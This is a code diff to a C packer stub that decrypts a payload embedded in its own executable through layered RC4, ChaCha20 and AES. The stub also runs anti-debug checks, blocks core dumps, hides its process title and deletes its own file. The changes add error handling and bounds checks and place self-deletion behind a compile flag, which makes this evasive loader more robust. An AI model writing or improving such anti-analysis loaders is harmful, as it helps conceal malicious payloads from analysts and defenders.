@@ -199,14 +199,14 @@ int comprehensive_anti_debug_check() {
 }
 
 
-void multi_layer_decrypt(uint8_t* data, size_t len, const pack_header_t* header) {
-    
+int multi_layer_decrypt(uint8_t* data, size_t len, const pack_header_t* header) {
     rc4_encrypt_decrypt(header->tertiary_key, 32, data, data, len);
-    
-    chacha20_decrypt(data, len, header->secondary_key, header->nonce);
+    if (chacha20_decrypt(data, len, header->secondary_key, header->nonce) != 0)
+        return -1;
 
-    aes256_decrypt(data, len, header->primary_key);
-    
+    if (aes256_decrypt(data, len, header->primary_key) != 0)
+        return -1;
+    return 0;
 }
 
 pack_header_t* find_packed_header(const uint8_t* data, size_t data_size) {
@@ -224,6 +224,18 @@ pack_header_t* find_packed_header(const uint8_t* data, size_t data_size) {
     return NULL;
 }
 
+static void maybe_self_delete(const char* self_path) {
+#ifdef HARMLESS_SELF_DELETE
+    if (self_path && self_path[0] != '\0') {
+        if (unlink(self_path) < 0) {
+            DBG("self-delete failed\n");
+        }
+    }
+#else
+    (void)self_path;
+#endif
+}
+
 int main(int argc, char* argv[], char* envp[]) {
     FILE* self_fp;
     uint8_t* self_data;
@@ -233,7 +245,6 @@ int main(int argc, char* argv[], char* envp[]) {
     uint8_t* decrypted_data;
     uint32_t calculated_crc;
 
-    unlink(argv[0]);
     prevent_core_dumps();
     hide_process_title(argc, argv);
 
@@ -244,9 +255,20 @@ int main(int argc, char* argv[], char* envp[]) {
         return 1;
     }
 
-    fseek(self_fp, 0, SEEK_END);
-    self_size = ftell(self_fp);
-    fseek(self_fp, 0, SEEK_SET);
+    if (fseek(self_fp, 0, SEEK_END) != 0) {
+        fclose(self_fp);
+        return 1;
+    }
+    long self_size_long = ftell(self_fp);
+    if (self_size_long <= 0) {
+        fclose(self_fp);
+        return 1;
+    }
+    self_size = (size_t)self_size_long;
+    if (fseek(self_fp, 0, SEEK_SET) != 0) {
+        fclose(self_fp);
+        return 1;
+    }
 
     if (self_size == 0 || self_size > SIZE_MAX / 2) {
         fclose(self_fp);
@@ -267,6 +289,8 @@ int main(int argc, char* argv[], char* envp[]) {
         return 1;
     }
     fclose(self_fp);
+
+    maybe_self_delete(argc > 0 ? argv[0] : NULL);
 
     header = find_packed_header(self_data, self_size);
     if (!header) {
@@ -292,7 +316,10 @@ int main(int argc, char* argv[], char* envp[]) {
     }
 
     encrypted_data = (uint8_t*)header + sizeof(pack_header_t);
-    if (encrypted_data + header->packed_size > self_data + self_size) {
+    size_t payload_offset = (size_t)(encrypted_data - self_data);
+    if (payload_offset > self_size ||
+        header->original_size > header->packed_size ||
+        (size_t)header->packed_size > self_size - payload_offset) {
         DBG("packed payload out of bounds\n");
         secure_memory_wipe(self_data, self_size);
         free(self_data);
@@ -308,7 +335,14 @@ int main(int argc, char* argv[], char* envp[]) {
 
     memcpy(decrypted_data, encrypted_data, header->original_size);
 
-    multi_layer_decrypt(decrypted_data, header->original_size, header);
+    if (multi_layer_decrypt(decrypted_data, header->original_size, header) != 0) {
+        DBG("decryption failed\n");
+        secure_memory_wipe(decrypted_data, header->original_size);
+        secure_memory_wipe(self_data, self_size);
+        free(decrypted_data);
+        free(self_data);
+        return 1;
+    }
     calculated_crc = crc32(decrypted_data, header->original_size);
     if (calculated_crc != header->crc32) {
         DBG("crc check failed\n");
